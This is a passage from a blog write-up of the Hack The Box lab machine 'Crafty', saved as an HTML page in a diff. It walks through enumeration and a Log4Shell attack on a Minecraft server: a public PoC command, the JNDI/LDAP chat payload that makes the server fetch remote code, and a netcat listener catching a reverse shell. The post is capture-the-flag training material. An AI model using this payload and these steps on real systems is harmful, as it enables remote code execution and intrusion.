@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Crafty&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Crafty">
+  
+    <meta name="description" content="Personally, Crafty is one of my least favourite box recently due to its instability. It involves exploiting a Log4J vulnerability in a Minecraft server. While this might seem straightforward, the exploit messes up the Minecraft process, giving you only one chance. If you made a mistake in the payload or somehow lost the shell, you’ll have to reset the box and do everything again. This is particularly annoying on shared servers where everyone is constantly attempting resets, and is reflected by its low user rating.">
+    <meta property="og:description" content="Personally, Crafty is one of my least favourite box recently due to its instability. It involves exploiting a Log4J vulnerability in a Minecraft server. While this might seem straightforward, the exploit messes up the Minecraft process, giving you only one chance. If you made a mistake in the payload or somehow lost the shell, you’ll have to reset the box and do everything again. This is particularly annoying on shared servers where everyone is constantly attempting resets, and is reflected by its low user rating.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/c01c8813bfc7795ae0717bbee7b407d1.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/c01c8813bfc7795ae0717bbee7b407d1.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Crafty</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jun 30, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/2aa83d3747b74581954792108bedb21e" class="PageRoot"><h3 id="https://www.notion.so/88e70f9219234d81aecd4a319352688a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/88e70f9219234d81aecd4a319352688a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/40eedad3abee46e6ba733eacfcd5c0d7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Personally, Crafty is one of my least favourite box recently due to its instability. It involves exploiting a Log4J vulnerability in a Minecraft server. While this might seem straightforward, the exploit messes up the Minecraft process, giving you only one chance. If you made a mistake in the payload or somehow lost the shell, you’ll have to reset the box and do everything again. This is particularly annoying on shared servers where everyone is constantly attempting resets, and is reflected by its low user rating.</span></span></p></div><div id="https://www.notion.so/b0ab92f67ae34014a6730faab70a5b38" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f4fb19f342bc4ba69a1cc03609e81811" class="Divider"></div><h3 id="https://www.notion.so/66c50edb23014e878decfbc5062c9292" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/66c50edb23014e878decfbc5062c9292"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/94411703b0c640048610ec9ed045848c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/60e87ee2af2342ee9485e00a43ef70a9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.16.71
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 12:52 ACDT
+Nmap scan report for 10.129.16.71
+Host is up (0.33s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+25565/tcp open  minecraft
+
+Nmap done: 1 IP address (1 host up) scanned in 133.31 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 80,25565 10.129.16.71
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 13:01 ACDT
+Nmap scan report for 10.129.16.71
+Host is up (0.34s latency).
+
+PORT      STATE SERVICE   VERSION
+80/tcp    open  http      Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://crafty.htb
+|_http-server-header: Microsoft-IIS/10.0
+25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019 (89%)
+Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   352.10 ms 10.10.14.1
+2   352.25 ms 10.129.16.71
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.01 seconds</span></span></span></code></pre><div id="https://www.notion.so/c0ade2f503624fa0aee08444708dec6f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap found two open ports. There’s a web server that redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">crafty.htb</code></span><span class="SemanticString">. I’ll add the hostname to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/b0294090c4f44677a9d7cf77c565757a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Crafty</span>
+<span class="token number">10.129</span>.16.71    crafty.htb</span></span></span></code></pre><div id="https://www.notion.so/d4faa09b5b964da78d2360872acb6c7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Port 25565 is a Minecraft server. The version it’s running is 1.16.5, which was </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.minecraft.net/en-us/article/minecraft-java-edition-1-16-5">released in early 2021</a></span><span class="SemanticString">. A quick Google search strongly suggests that it’s vulnerable to the infamous Log4Shell attack, we’ll come back to this later.</span></span></p></div><div id="https://www.notion.so/9bac16fe92e649aba6fadb77a724c01d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6e749643-7920-4697-9539-dc225b5199d9%2FUntitled.png?width=1352&amp;table=block&amp;id=9bac16fe-92e6-49ab-a6fa-db77a724c01d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6e749643-7920-4697-9539-dc225b5199d9%2FUntitled.png?width=1352&amp;table=block&amp;id=9bac16fe-92e6-49ab-a6fa-db77a724c01d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/dff81dec2824448eb95cd0ab525dab55" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d6727cdbf48453fa473ca34972981c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/d79675c10f34481f98ff04e5b84fe095" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5fc0a003-cf28-48e6-8d9d-e7c74661c3ad%2FUntitled.png?width=1916&amp;table=block&amp;id=d79675c1-0f34-481f-98ff-04e5b84fe095"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5fc0a003-cf28-48e6-8d9d-e7c74661c3ad%2FUntitled.png?width=1916&amp;table=block&amp;id=d79675c1-0f34-481f-98ff-04e5b84fe095" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/43b990361ba845238e238ea8c31a9753" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page is a simple Minecraft-themed page. It mentions a subdomain </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">play.crafty.htb</code></span><span class="SemanticString">, but it actually redirects back here:</span></span></p></div><pre id="https://www.notion.so/e85d6cfe68ac4c859b5f53487bedcfbb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://play.crafty.htb
+
+&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This document may be found &lt;a HREF=&quot;http://crafty.htb&quot;&gt;here&lt;/a&gt;&lt;/body&gt;</span></span></span></code></pre><div id="https://www.notion.so/c9a08a258cef432fa299506b32f8e750" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking on any of the three icons redirects to the “Coming Soon” page below:</span></span></p></div><div id="https://www.notion.so/a8caf8415cf54d5299defd974c78e5fd" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd1d38799-e15b-479f-a124-208da76ff3d7%2FUntitled.png?width=1917&amp;table=block&amp;id=a8caf841-5cf5-4d52-99de-fd974c78e5fd"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fd1d38799-e15b-479f-a124-208da76ff3d7%2FUntitled.png?width=1917&amp;table=block&amp;id=a8caf841-5cf5-4d52-99de-fd974c78e5fd" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ddcbea41a8e04076aa38eacefa8ea4ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Other than that, there’s nothing else useful to see. I’ll move on to the other port.</span></span></p></div><div id="https://www.notion.so/202dbc326f2b4799bd1e6f87e8ff8bf6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4ffd9bd737284a6884db7fb7b53424d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP25565 — Minecraft:</strong></span></span></p></div><div id="https://www.notion.so/f4766628c72a468b82a7db81ff1bb05b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To interact with the Minecraft port, I’ll need a client. I know a lot of people installed the Minecraft game in their VM just for this purpose, but I find this approach unnecessarily complicated, and I don’t have a Minecraft account anyway.</span></span></p></div><div id="https://www.notion.so/904c727ff67b4d0ebd40de074ebdc0c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s many clients available on GitHub, and I picked </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/MCCTeam/Minecraft-Console-Client">MCC</a></span><span class="SemanticString"> as it seems to be the most stable out of all. I downloaded their latest release and managed to log in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">minecraft</code></span><span class="SemanticString"> without a password.</span></span></p></div><pre id="https://www.notion.so/22b0ded90a90457797f81404cadffb99" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> ./MinecraftClient-20240130-245-linux-x64 minecraft &#x27;&#x27; play.crafty.htb
+
+Minecraft Console Client v1.20.2 - for MC 1.4.6 to 1.20.2 - Github.com/MCCTeam
+GitHub build 245, built on 2024-01-30 from commit 1e60b61
+Resolving play.crafty.htb...
+Password(invisible): 
+You chose to run in offline mode.
+Retrieving Server Info...
+Server version : 1.16.5 (protocol v754)
+[MCC] Version is supported.
+Logging in...
+[MCC] Server is in offline mode.
+[MCC] Server was successfully joined.
+Type &#x27;/quit&#x27; to leave the server.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>&gt;</span></mark></span></span></code></pre><div id="https://www.notion.so/876a540fdfd6451e93159ff28a13d2bf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to their </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://mccteam.github.io/guide/usage.html">docs</a></span><span class="SemanticString">, there’s many things I can do with the console, such as making the character sleep or attack a zombie, although I can die from this sometimes. Most importantly it allows sending messages in the chat.</span></span></p></div><div id="https://www.notion.so/005ab1aba3424837a7e7d72c48b4e6a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/291d259351e54ea683ebe1e50d5e7187" class="Divider"></div><h3 id="https://www.notion.so/e40aa6f65f1043c3b598f699bce8bf34" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/e40aa6f65f1043c3b598f699bce8bf34"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/a0cc438191c34a7ab27f1b052014a26e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Minecraft Server Log4Shell RCE:</strong></span></span></p></div><div id="https://www.notion.so/3540a139bb634989a700155c9aac0e4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Log4J is a very popular open-source logging framework for Java-based applications, and are widely used in many enterprise applications. Hence it was a very big deal in late 2021 when Log4Shell (</span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a></span><span class="SemanticString">, CVSS 10.0) — a critical flaw in Log4J that can result in RCE — was discovered as a zero-day, and it’s estimated to have affected hundreds of millions systems worldwide.</span></span></p></div><div id="https://www.notion.so/0531ccbd5ef54b47ad175671e9576f3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Minecraft is one of the many services that was affected by this. Somewhat relatable to SSTI, the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.trendmicro.com/en_au/what-is/apache-log4j-vulnerability.html">Log4J vulnerability</a></span><span class="SemanticString"> lies in its inability to properly handle strings in the format of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">${&lt;string&gt;}</code></span><span class="SemanticString">. By sending into the chat a specially crafted payload in this format, the server may be tricked into fetching serialized Java from my LDAP server and resulting in code execution.</span></span></p></div><div id="https://www.notion.so/2be2897804bd4d5eaf2b350c7ef5c279" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There are many public POC available on GitHub, including </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/kozmer/log4j-shell-poc">this</a></span><span class="SemanticString"> one that I used. According to the instructions, I’ll need a specific Java version (Java SE Development Kit 8u20, can be downloaded </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">here</a></span><span class="SemanticString">). Since it’s a Windows box, the payload command in the Python script must also be changed to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cmd.exe</code></span><span class="SemanticString"> instead of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/bin/sh</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/f684bb64b0124816b73d155290037784" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, I’ll start the web and LDAP server with the exploit script:</span></span></p></div><pre id="https://www.notion.so/ffd6f63db4684645be69dc65930313e5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> python poc.py --userip 10.10.14.18 --webport 8000 --lport 8001
+
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+
+[+] Exploit java class created success
+[+] Setting up LDAP server
+
+[+] Send me: ${jndi:ldap://localhost:1389/a}
+
+[+] Starting Webserver on port 8000 http://0.0.0.0:8000
+Listening on 0.0.0.0:1389</span></span></span></code></pre><div id="https://www.notion.so/7e27e28da0ad440b95e7ee1bf7386480" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As instructed, I’ll send the following message in the Minecraft chat:</span></span></p></div><pre id="https://www.notion.so/6c7b9cbae46b4403b12a68f61725973b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>&gt;</span></mark></span><span class="SemanticString"><span> /send ${jndi:ldap://10.10.14.18:1389/a}</span></span></span></code></pre><div id="https://www.notion.so/008ffbb66d6d414fb356c467cb8af269" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A stream of LDAP and HTTP requests were detected from the server:</span></span></p></div><pre id="https://www.notion.so/f02cf107c873410b9d48666215325347" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Listening on 0.0.0.0:1389
+Send LDAP reference result for a redirecting to http://10.10.14.18:8000/Exploit.class
+10.129.16.71 - - [11/Feb/2024 15:58:13] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+Send LDAP reference result for a redirecting to http://10.10.14.18:8000/Exploit.class
+10.129.16.71 - - [11/Feb/2024 15:58:15] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -
+Send LDAP reference result for a redirecting to http://10.10.14.18:8000/Exploit.class
+10.129.16.71 - - [11/Feb/2024 15:58:17] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/91b864dd17864b28ae86df09c8dcd849" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And after a while, a shell session as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_minecraft</code></span><span class="SemanticString"> was also sent back:</span></span></p></div><pre id="https://www.notion.so/661420707f6249dcae52833cd5543529" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001    
+[sudo] password for chengw: 
+listening on [any] 8001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.129.16.71] 49702
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_minecraft\server&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+crafty\svc_minecraft</span></span></span></code></pre><div id="https://www.notion.so/c57cbc08feb1434599ec27c045bc1053" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">While this exploit PoC is easy to use, it somehow crashes the Minecraft process. Re-running the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nmap</code></span><span class="SemanticString"> scan now would show port 25565 as closed, hence a reset would be required if I lost the shell (which happened several times). This caused a lot of frustration on shared servers, whenever someone runs the exploit, the port gets closed and everyone else gets blocked. This led to tons of resets, even hitting the daily reset limit multiple times in the first week of release.</span></span></p></div><div id="https://www.notion.so/9ee3e21538eb4512aa72c0f090f0314d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/91b8d459ef334b41ac5f5b860cd88463" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/755be1f279194540a1920d01d26e10fe" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\svc_minecraft\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+5ffb9a56************************</span></span></span></code></pre><div id="https://www.notion.so/fb5e8f2dfa374929b370b5a4e5d08f5f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/49dc92349d0b4bfd83b6452d68bd7951" class="Divider"></div><h3 id="https://www.notion.so/3e29151286ca4d2e929c89fb0760026a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3e29151286ca4d2e929c89fb0760026a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation:</span></span></h3><div id="https://www.notion.so/d705637fb5cc498ea40ca7614cd0967e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Privilege escalation is pretty straightforward. In the user’s home 